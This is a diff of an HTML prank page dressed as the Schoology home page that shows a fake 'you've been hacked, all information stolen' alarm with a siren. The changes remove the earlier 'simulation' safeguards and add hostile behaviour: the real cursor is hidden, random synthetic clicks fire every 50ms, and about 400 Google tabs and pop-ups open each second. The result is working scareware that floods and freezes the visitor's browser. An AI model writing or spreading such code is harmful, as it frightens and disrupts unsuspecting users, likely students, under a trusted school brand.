@@ -6,16 +6,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
     <title>Home | Schoology</title> 
     <style>
-        /* Existing styles */
         body {
             margin: 0;
             padding: 0;
-            overflow: hidden;
+            overflow: hidden; 
             font-family: Arial, sans-serif;
             color: white;
             background-color: red; 
             position: relative;
             height: 100vh; 
+            cursor: none; /* Hides the default cursor */
             transition: background-color 0.5s; 
         }
         iframe {
@@ -77,9 +77,20 @@
             75% { transform: translate(-5px, 0); }
             100% { transform: translate(0, 0); }
         }
+        .custom-cursor {
+            width: 20px;
+            height: 20px;
+            background-color: red;
+            position: absolute;
+            z-index: 20;
+            pointer-events: none;
+            border: 2px solid white;
+            transition: transform 0.1s;
+        }
     </style>
 </head>
 <body>
+    <div class="custom-cursor" id="cursorBox"></div>
     <iframe src="https://home-schoology.netlify.app" sandbox="allow-same-origin allow-scripts"></iframe>
     <div class="overlay" id="clickOverlay">Click anywhere to proceed!</div>
     <div id="hackMessage">YOU'VE BEEN HACKED! <br> ALL INFORMATION = STOLEN!</div>
@@ -90,16 +101,17 @@
     </audio>
 
     <script>
-        let popUpInterval; 
-        let chaosInterval;
+        let popUpInterval;
         let titleChangeInterval;
-        let backgroundChangeInterval;
+        let chaosInterval;
+        let backgroundChangeInterval; 
         let cursorMoveInterval;
-        let screenShakeInterval; 
+
+        const cursorBox = document.getElementById('cursorBox');
 
         document.getElementById('clickOverlay').addEventListener('click', function() {
             this.classList.add('hidden');
-            var sirenAudio = document.getElementById('sirenAudio');
+            const sirenAudio = document.getElementById('sirenAudio');
             sirenAudio.currentTime = 0; 
             sirenAudio.play().catch(error => {
                 console.error("Error playing audio:", error);
@@ -108,44 +120,57 @@
             const hackMessage = document.getElementById('hackMessage');
             hackMessage.style.display = 'block';
 
-            simulateEmailSend();
-            
             document.body.style.backgroundColor = 'black';
 
-            playPopupSimulation();
-            randomCursorMovement();
+            startPopupsAndTabs(); // Start opening popups and tabs
+            chaoticMouseMovement();
             startScreenShake(); 
-            infiniteAlerts(); 
 
             chaosInterval = setInterval(() => {
                 showRandomErrorMessage();
-            }, 500);
+            }, 250); 
 
             titleChangeInterval = setInterval(() => {
                 document.title = "Hacked! " + Math.random().toString(36).substring(7);
-            }, 1000);
+            }, 500); 
 
             backgroundChangeInterval = setInterval(() => {
                 document.body.style.backgroundColor = getRandomColor();
-            }, 300);
+            }, 200); 
             
             // Automatically "restart" the page after 10 seconds
             setTimeout(() => {
                 document.getElementById('finalGif').style.display = 'block';
                 clearInterval(chaosInterval); 
-                clearInterval(popUpInterval);
                 clearInterval(titleChangeInterval);
                 clearInterval(backgroundChangeInterval);
                 clearInterval(cursorMoveInterval);
-                clearInterval(screenShakeInterval);
-                window.location.href = "https://funpage.example.com"; // Redirect to a fun page
-            }, 10000); // 10 seconds for quick testing
+                window.location.href = "https://funpage.example.com"; 
+            }, 10000); 
         });
 
-        function simulateEmailSend() {
-            const emailMessage = "Your information has been 'sent' to the hacker!";
-            // Optional: add a hidden element to inform internally without user alerts
-            console.log(emailMessage); 
+        function chaoticMouseMovement() {
+            const randomMouseClick = () => {
+                const x = Math.random() * (window.innerWidth - 20);
+                const y = Math.random() * (window.innerHeight - 20);
+                cursorBox.style.transform = `translate(${x}px, ${y}px)`;
+
+                const clickEvent = new MouseEvent('click', {
+                    clientX: x + 10, 
+                    clientY: y + 10,
+                    bubbles: true,
+                    cancelable: true
+                });
+                document.elementFromPoint(x + 10, y + 10)?.dispatchEvent(clickEvent);
+            };
+
+            cursorMoveInterval = setInterval(randomMouseClick, 50); 
+
+            setInterval(() => {
+                const randomX = Math.random() * (window.innerWidth - 20);
+                const randomY = Math.random() * (window.innerHeight - 20);
+                cursorBox.style.transform = `translate(${randomX}px, ${randomY}px)`;
+            }, 100); 
         }
 
         function showRandomErrorMessage() {
@@ -157,48 +182,40 @@
                 "Warning: Your files are at risk of corruption!"
             ];
             const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-            console.log(randomMessage); // Log the messages, do not alert
+            console.log(randomMessage);
         }
 
-        function playPopupSimulation() {
-            popUpInterval = setInterval(startPopUpSimulation, 100); 
-        }
-
-        function startPopUpSimulation() {
-            for (let i = 0; i < 100; i++) { 
-                try {
-                    const popUp = window.open("about:blank", "_blank"); 
-                    popUp.document.write(`<h2 style="color: red;">WARNING: Your system has been hacked!</h2>`);
-                    popUp.document.close();
-                    setTimeout(() => {
-                        popUp.close();
-                    }, 3000); 
-                } catch (e) {
-                    console.error("Popup blocked or error occurred:", e);
+        function startPopupsAndTabs() {
+            setInterval(() => {
+                for (let i = 0; i < 200; i++) {
+                    try {
+                        // Open Google tabs
+                        window.open("https://www.google.com", "_blank");
+                        
+                        // Open Google pop-ups
+                        const popUp = window.open("https://www.google.com", "_blank");
+                        if (popUp) {
+                            popUp.document.write(`<h2 style="color: red;">WARNING: Your system has been hacked!</h2>`);
+                            popUp.document.close();
+                            setTimeout(() => {
+                                popUp.close(); // Close after 3 seconds
+                            }, 3000); 
+                        }
+                    } catch (e) {
+                        console.error("Popup blocked or error occurred:", e);
+                        // Optionally handle the error, e.g., notify the user
+                    }
                 }
-            }
-        }
-
-        function infiniteAlerts() {
-            // Removed the alert loop to maintain seamless experience
-            console.log("WARNING: Your system has been hacked!"); // Optional logging.
-        }
-
-        function randomCursorMovement() {
-            cursorMoveInterval = setInterval(() => {
-                const x = Math.random() * window.innerWidth;
-                const y = Math.random() * window.innerHeight;
-                window.scrollTo(x, y);
-            }, 500); // Move the cursor every 500 milliseconds
+            }, 1000); // This runs every second
         }
 
         function startScreenShake() {
-            screenShakeInterval = setInterval(() => {
+            setInterval(() => {
                 document.body.style.animation = "shake 0.1s ease";
                 setTimeout(() => {
                     document.body.style.animation = ""; // Clear animation
                 }, 100);
-            }, 500); // Shake every 0.5 seconds
+            }, 100); 
         }
 
         function getRandomColor() {
@@ -209,7 +226,6 @@
             }
             return color;
         }
-
     </script>
 </body>
 </html>
